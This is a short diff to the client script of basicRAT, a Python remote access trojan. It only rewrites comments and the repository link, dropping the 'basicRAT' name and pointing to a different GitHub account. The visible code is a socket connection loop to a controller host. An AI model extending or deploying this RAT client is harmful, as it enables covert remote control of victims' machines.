@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 #
-# basicRAT client
-# https://github.com/vesche/basicRAT
+# RAT client
+# https://github.com/harshivara/basicRAT
 #
 
 import argparse
@@ -104,7 +104,7 @@ def main():
         conn = socket.socket()
 
         try:
-            # attempt to connect to basicRAT server
+            # attempt to connect to RAT server
             conn.connect((host, port))
         except socket.error:
             time.sleep(timeout)
